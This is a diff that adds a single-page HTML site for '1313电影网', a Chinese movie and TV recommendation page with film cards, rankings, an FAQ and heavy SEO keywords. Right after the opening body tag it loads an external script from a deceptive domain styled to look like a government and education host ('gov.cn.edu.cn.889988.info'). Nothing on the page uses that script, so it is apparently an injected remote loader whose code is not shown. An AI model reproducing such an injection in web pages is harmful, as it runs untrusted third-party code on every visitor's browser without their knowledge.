@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>1313电影网 - 1313dianyingwang-top 高清电影与剧集推荐</title>
+<meta name="description" content="1313电影网（https://1313dianyingwang-top）以老电影院票根风格推荐最新高清电影、热播剧集、动画与榜单，移动端自适应，必应收录友好。">
+<meta name="keywords" content="1313电影网, 1313dianyingwang-top, 高清电影, 在线观看, 热播剧集, 电影推荐">
+<meta name="author" content="1313电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;color:#f3efe6;line-height:1.75;overflow-x:hidden;
+background:
+radial-gradient(900px 420px at 8% -8%,rgba(244,162,97,.16),transparent 60%),
+radial-gradient(820px 420px at 96% 6%,rgba(214,90,74,.14),transparent 60%),
+linear-gradient(180deg,#06201f 0%,#0a2b29 36%,#10302d 70%,#08181a 100%)}
+a{color:#f4a261;text-decoration:none;transition:.3s}
+a:hover{color:#ffe2bd}
+.t13-nav{position:fixed;top:0;width:100%;z-index:1000;background:rgba(6,32,31,.84);backdrop-filter:blur(10px);border-bottom:1px solid rgba(244,162,97,.28)}
+.t13-in{max-width:1180px;margin:0 auto;height:66px;padding:0 1.5rem;display:flex;align-items:center;justify-content:space-between}
+.t13-logo{display:flex;align-items:center;gap:.7rem}
+.t13-badge{width:44px;height:44px;border-radius:8px;background:linear-gradient(135deg,#f4a261,#d65a4a);display:flex;align-items:center;justify-content:center;font-weight:900;color:#1a0f08;box-shadow:0 0 16px rgba(244,162,97,.4);font-style:italic}
+.t13-name{font-size:1.3rem;font-weight:900;color:#fff6ea;letter-spacing:1px}
+.t13-name small{display:block;font-size:.55rem;letter-spacing:5px;color:#9fd2c4;font-weight:400}
+.t13-links{display:flex;gap:1.4rem;list-style:none}
+.t13-links a{font-size:.85rem;font-weight:700;color:#d6e7df}
+.t13-links a:hover{color:#f4a261}
+.t13-toggle{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:6px}
+.t13-toggle span{width:24px;height:2px;background:#f4a261}
+.t13-hero{margin-top:66px;padding:6rem 1.5rem 4.5rem;text-align:center;position:relative;overflow:hidden}
+.t13-hero::before{content:"NO.1313";position:absolute;left:50%;top:4%;transform:translateX(-50%) rotate(-6deg);font-size:6rem;font-weight:900;color:rgba(244,162,97,.07);border:2px dashed rgba(244,162,97,.18);padding:.2rem 1.2rem}
+.t13-kick{display:inline-block;padding:.35rem 1.3rem;border:1px dashed rgba(244,162,97,.5);color:#ffd9a8;font-size:.76rem;letter-spacing:3px;margin-bottom:1.4rem;background:rgba(244,162,97,.06)}
+.t13-hero h1{font-size:2.9rem;font-weight:900;color:#fff;line-height:1.18;position:relative;z-index:1}
+.t13-hero h1 span{background:linear-gradient(90deg,#ffd9a8,#f4a261,#d65a4a);-webkit-background-clip:text;background-clip:text;color:transparent}
+.t13-hero p{color:#c7ddd5;font-size:1.05rem;max-width:640px;margin:1.2rem auto 1.8rem;position:relative;z-index:1}
+.t13-domain{display:inline-block;padding:.8rem 1.9rem;border:1px dashed rgba(244,162,97,.5);color:#ffd9a8;font-family:"Courier New",monospace;font-weight:700;margin-bottom:1.8rem}
+.t13-btn{display:inline-block;padding:1rem 3rem;font-weight:800;letter-spacing:1px;color:#231204;background:linear-gradient(135deg,#ffe2bd,#f4a261);box-shadow:0 10px 30px rgba(244,162,97,.32);border:1px solid rgba(255,226,189,.5)}
+.t13-btn:hover{transform:translateY(-3px);color:#231204;box-shadow:0 14px 38px rgba(244,162,97,.5)}
+.t13-sec{max-width:1180px;margin:0 auto;padding:4rem 1.5rem;position:relative;z-index:1}
+.t13-head{text-align:center;margin-bottom:2.6rem}
+.t13-head h2{font-size:2rem;font-weight:900;color:#fff6ea}
+.t13-head h2::before{content:"🎟 ";}
+.t13-head p{color:#9fd2c4;font-size:.85rem;margin-top:.4rem;letter-spacing:1px}
+.t13-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(248px,1fr));gap:1.5rem}
+.t13-card{background:linear-gradient(180deg,#0e2a28,#0a1f1f);border:1px solid rgba(244,162,97,.18);overflow:hidden;transition:.4s;position:relative}
+.t13-card::before{content:"";position:absolute;top:0;bottom:0;left:14px;width:2px;background:repeating-linear-gradient(180deg,rgba(244,162,97,.5) 0 6px,transparent 6px 12px)}
+.t13-card:hover{transform:translateY(-6px);border-color:rgba(244,162,97,.55);box-shadow:0 16px 36px rgba(244,162,97,.18)}
+.t13-cover{height:198px;margin-left:28px;display:flex;align-items:flex-end;padding:1rem;font-weight:900;font-size:1.05rem;color:#fff;position:relative}
+.t13-cover::after{content:"";position:absolute;inset:0;background:linear-gradient(160deg,rgba(244,162,97,.12),rgba(6,20,20,.66))}
+.t13-cover b{position:relative;z-index:1;text-shadow:0 2px 8px rgba(0,0,0,.6)}
+.v1{background:#143a36}.v2{background:#3a2417}.v3{background:#2a183a}.v4{background:#102a33}.v5{background:#33210f}.v6{background:#2f1530}.v7{background:#16313a}.v8{background:#331722}
+.t13-body{padding:1.1rem 1.2rem 1.1rem 2.4rem}
+.t13-body h3{color:#fff;font-size:1rem;margin-bottom:.5rem;font-weight:800}
+.t13-tags{display:flex;flex-wrap:wrap;gap:.4rem;margin-bottom:.6rem}
+.t13-tags span{padding:.18rem .6rem;border:1px solid rgba(244,162,97,.32);color:#ffd9a8;font-size:.7rem}
+.t13-score{color:#f4a261;font-weight:900}
+.t13-rank{max-width:840px;margin:0 auto}
+.t13-ri{display:flex;align-items:center;gap:1.1rem;padding:1.1rem 1.3rem;margin-bottom:.8rem;background:linear-gradient(90deg,#0e2a28,#0a1f1f);border:1px solid rgba(244,162,97,.16);border-left:4px dashed #f4a261;transition:.3s}
+.t13-ri:hover{transform:translateX(6px);border-left-color:#d65a4a}
+.t13-no{font-size:1.4rem;font-weight:900;color:#f4a261;min-width:42px;text-align:center;font-style:italic}
+.t13-ri h3{color:#fff;font-size:1rem}
+.t13-ri p{font-size:.8rem;color:#9fd2c4}
+.t13-rs{margin-left:auto;padding:.3rem .8rem;border:1px dashed rgba(244,162,97,.4);color:#ffd9a8;font-weight:800;font-size:.85rem}
+.t13-about{max-width:800px;margin:0 auto;text-align:center;padding:2.8rem;background:linear-gradient(180deg,#0e2a28,#0a1f1f);border:1px solid rgba(244,162,97,.2)}
+.t13-about p{color:#d6e7df;margin-bottom:1.1rem}
+.t13-about b{color:#f4a261}
+.t13-dom2{display:inline-block;margin-top:1rem;padding:1rem 2rem;border:1px dashed rgba(244,162,97,.5);color:#ffd9a8;font-family:monospace;font-weight:700}
+.t13-faq{max-width:840px;margin:0 auto}
+.t13-fi{background:#0b2322;border:1px solid rgba(244,162,97,.16);margin-bottom:.7rem;overflow:hidden}
+.t13-fi summary{padding:1.1rem 1.4rem;cursor:pointer;font-weight:800;color:#ffd9a8;list-style:none;position:relative;padding-right:3rem}
+.t13-fi summary::-webkit-details-marker{display:none}
+.t13-fi summary::after{content:"▸";position:absolute;right:1.4rem;top:50%;transform:translateY(-50%);color:#f4a261}
+.t13-fi[open] summary::after{content:"▾"}
+.t13-fi p{padding:0 1.4rem 1.1rem;color:#bcd3cb;font-size:.93rem}
+.t13-foot{text-align:center;padding:2.5rem 1.5rem;color:#7fae9f;font-size:.8rem;border-top:1px solid rgba(244,162,97,.16);background:rgba(5,18,18,.92)}
+.t13-foot p{margin-bottom:.3rem}
+@media(max-width:768px){
+.t13-links{display:none;position:absolute;top:100%;left:0;width:100%;background:rgba(6,32,31,.97);flex-direction:column;padding:.5rem 0}
+.t13-links.show{display:flex}
+.t13-links a{padding:1rem 1.5rem}
+.t13-toggle{display:flex}
+.t13-hero h1{font-size:2rem}
+.t13-hero::before{font-size:3rem}
+.t13-sec{padding:3rem 1rem}
+.t13-head h2{font-size:1.6rem}
+.t13-grid{grid-template-columns:repeat(auto-fill,minmax(168px,1fr));gap:1rem}
+.t13-cover{height:160px;font-size:.92rem}
+}
+@media(max-width:480px){.t13-hero h1{font-size:1.65rem}.t13-grid{grid-template-columns:1fr 1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<nav class="t13-nav">
+  <div class="t13-in">
+    <div class="t13-logo">
+      <div class="t13-badge">1313</div>
+      <div class="t13-name">1313电影网<small>NO.1313 CINEMA HALL</small></div>
+    </div>
+    <ul class="t13-links" id="t13Links">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movies">电影</a></li>
+      <li><a href="#series">剧集</a></li>
+      <li><a href="#ranking">榜单</a></li>
+      <li><a href="#about">关于</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="t13-toggle" onclick="t13()"><span></span><span></span><span></span></div>
+  </div>
+</nav>
+
+<section class="t13-hero" id="home">
+  <div class="t13-kick">检票入场 · 1313 号厅已亮灯</div>
+  <h1>1313电影网 <span>像撕一张老电影票根</span></h1>
+  <p>1313电影网（1313dianyingwang-top）用影院票根风整理最新高清电影、热播剧集、动画与冷门佳片：深松石绿大厅、琥珀金票纸、暗红检票章。</p>
+  <div class="t13-domain">https://1313dianyingwang-top</div><br>
+  <a href="#movies" class="t13-btn">撕票进厅</a>
+</section>
+
+<section class="t13-sec" id="movies">
+  <div class="t13-head"><h2>最新电影</h2><p>1313dianyingwang-top 今日排片</p></div>
+  <div class="t13-grid">
+    <div class="t13-card"><div class="t13-cover v1"><b>沙丘2</b></div><div class="t13-body"><h3>沙丘2</h3><div class="t13-tags"><span>科幻</span><span>冒险</span></div><div class="t13-score">★ 9.2</div></div></div>
+    <div class="t13-card"><div class="t13-cover v2"><b>奥本海默</b></div><div class="t13-body"><h3>奥本海默</h3><div class="t13-tags"><span>传记</span><span>历史</span></div><div class="t13-score">★ 8.8</div></div></div>
+    <div class="t13-card"><div class="t13-cover v3"><b>哥斯拉大战金刚2</b></div><div class="t13-body"><h3>哥斯拉大战金刚2</h3><div class="t13-tags"><span>动作</span><span>怪兽</span></div><div class="t13-score">★ 7.5</div></div></div>
+    <div class="t13-card"><div class="t13-cover v4"><b>坠落的审判</b></div><div class="t13-body"><h3>坠落的审判</h3><div class="t13-tags"><span>悬疑</span><span>剧情</span></div><div class="t13-score">★ 8.5</div></div></div>
+    <div class="t13-card"><div class="t13-cover v5"><b>美国内战</b></div><div class="t13-body"><h3>美国内战</h3><div class="t13-tags"><span>动作</span><span>惊悚</span></div><div class="t13-score">★ 7.2</div></div></div>
+    <div class="t13-card"><div class="t13-cover v6"><b>功夫熊猫4</b></div><div class="t13-body"><h3>功夫熊猫4</h3><div class="t13-tags"><span>动画</span><span>喜剧</span></div><div class="t13-score">★ 7.0</div></div></div>
+    <div class="t13-card"><div class="t13-cover v7"><b>你想活出怎样的人生</b></div><div class="t13-body"><h3>你想活出怎样的人生</h3><div class="t13-tags"><span>动画</span><span>奇幻</span></div><div class="t13-score">★ 8.1</div></div></div>
+    <div class="t13-card"><div class="t13-cover v8"><b>九龙城寨之围城</b></div><div class="t13-body"><h3>九龙城寨之围城</h3><div class="t13-tags"><span>动作</span><span>犯罪</span></div><div class="t13-score">★ 8.3</div></div></div>
+  </div>
+</section>
+
+<section class="t13-sec" id="series" style="background:rgba(5,18,18,.4)">
+  <div class="t13-head"><h2>热播剧集</h2><p>连映厅：一集接一集</p></div>
+  <div class="t13-grid">
+    <div class="t13-card"><div class="t13-cover v1"><b>繁花</b></div><div class="t13-body"><h3>繁花</h3><div class="t13-tags"><span>剧情</span><span>年代</span></div><div class="t13-score">★ 8.7</div></div></div>
+    <div class="t13-card"><div class="t13-cover v2"><b>庆余年2</b></div><div class="t13-body"><h3>庆余年2</h3><div class="t13-tags"><span>古装</span><span>权谋</span></div><div class="t13-score">★ 8.8</div></div></div>
+    <div class="t13-card"><div class="t13-cover v3"><b>三体</b></div><div class="t13-body"><h3>三体</h3><div class="t13-tags"><span>科幻</span><span>剧情</span></div><div class="t13-score">★ 8.9</div></div></div>
+    <div class="t13-card"><div class="t13-cover v4"><b>狂飙</b></div><div class="t13-body"><h3>狂飙</h3><div class="t13-tags"><span>犯罪</span><span>剧情</span></div><div class="t13-score">★ 8.9</div></div></div>
+    <div class="t13-card"><div class="t13-cover v5"><b>玫瑰的故事</b></div><div class="t13-body"><h3>玫瑰的故事</h3><div class="t13-tags"><span>都市</span><span>情感</span></div><div class="t13-score">★ 8.0</div></div></div>
+    <div class="t13-card"><div class="t13-cover v6"><b>南来北往</b></div><div class="t13-body"><h3>南来北往</h3><div class="t13-tags"><span>年代</span><span>剧情</span></div><div class="t13-score">★ 8.3</div></div></div>
+  </div>
+</section>
+
+<section class="t13-sec" id="ranking">
+  <div class="t13-head"><h2>1313 热门榜单</h2><p>检票数最高的几部</p></div>
+  <div class="t13-rank">
+    <div class="t13-ri"><div class="t13-no">01</div><div><h3>周处除三害</h3><p>动作 / 犯罪 / 9.0</p></div><div class="t13-rs">9.0</div></div>
+    <div class="t13-ri"><div class="t13-no">02</div><div><h3>飞驰人生2</h3><p>喜剧 / 运动 / 8.2</p></div><div class="t13-rs">8.2</div></div>
+    <div class="t13-ri"><div class="t13-no">03</div><div><h3>热辣滚烫</h3><p>剧情 / 喜剧 / 7.9</p></div><div class="t13-rs">7.9</div></div>
+    <div class="t13-ri"><div class="t13-no">04</div><div><h3>第二十条</h3><p>剧情 / 家庭 / 7.8</p></div><div class="t13-rs">7.8</div></div>
+    <div class="t13-ri"><div class="t13-no">05</div><div><h3>年会不能停！</h3><p>喜剧 / 职场 / 8.1</p></div><div class="t13-rs">8.1</div></div>
+    <div class="t13-ri"><div class="t13-no">06</div><div><h3>金手指</h3><p>犯罪 / 剧情 / 6.8</p></div><div class="t13-rs">6.8</div></div>
+    <div class="t13-ri"><div class="t13-no">07</div><div><h3>一闪一闪亮星星</h3><p>爱情 / 奇幻 / 6.5</p></div><div class="t13-rs">6.5</div></div>
+  </div>
+</section>
+
+<section class="t13-sec" id="about" style="background:rgba(5,18,18,.4)">
+  <div class="t13-head"><h2>关于 1313电影网</h2><p>为什么是 1313 号厅</p></div>
+  <div class="t13-about">
+    <p><b>1313电影网</b>（1313dianyingwang-top）把首页当成“影院大厅”：电影是场次，剧集是连映，榜单是检票数，推荐语像票根上的小字。</p>
+    <p>页面只做影视信息展示，不内置盗版播放源；深松石绿 + 琥珀金票根风，和破晓、黄昏、日本、终端、报纸等旧站都不重复。</p>
+    <div class="t13-dom2">https://1313dianyingwang-top</div>
+    <p style="margin-top:1.3rem;font-size:.82rem;color:#7fae9f">核心词：1313电影网、1313dianyingwang-top、高清电影、在线观看、最新影视推荐</p>
+  </div>
+</section>
+
+<section class="t13-sec" id="faq">
+  <div class="t13-head"><h2>常见问题</h2><p>检票口问答</p></div>
+  <div class="t13-faq">
+    <details class="t13-fi"><summary>1313电影网是什么？</summary><p>1313电影网（1313dianyingwang-top）是影视信息展示站，提供最新电影、剧集、动画与榜单推荐。</p></details>
+    <details class="t13-fi"><summary>官方网址是？</summary><p>https://1313dianyingwang-top</p></details>
+    <details class="t13-fi"><summary>手机能看吗？</summary><p>能，响应式布局，小屏导航自动变成汉堡菜单。</p></details>
+    <details class="t13-fi"><summary>有播放功能吗？</summary><p>本页仅展示信息，正版内容请到持牌平台观看。</p></details>
+    <details class="t13-fi"><summary>怎么给必应收录？</summary><p>去 Bing Webmaster Tools 提交 https://1313dianyingwang-top，把验证码填进 msvalidate.01 的 content 里。</p></details>
+  </div>
+</section>
+
+<footer class="t13-foot">
+  <p>© 2024 1313电影网 (1313dianyingwang-top) 版权所有</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 必应收录友好 / 不生成 robots.txt 与 sitemap.xml</p>
+  <p style="margin-top:.5rem;color:#56806f">本站仅提供影视信息展示，资源版权归原作者及发行方所有。</p>
+</footer>
+
+<script>
+function t13(){document.getElementById('t13Links').classList.toggle('show')}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var h=this.getAttribute('href');
+    if(h.length>1){var t=document.querySelector(h);if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});document.getElementById('t13Links').classList.remove('show')}}
+  })
+});
+</script>
+</body>
+</html>
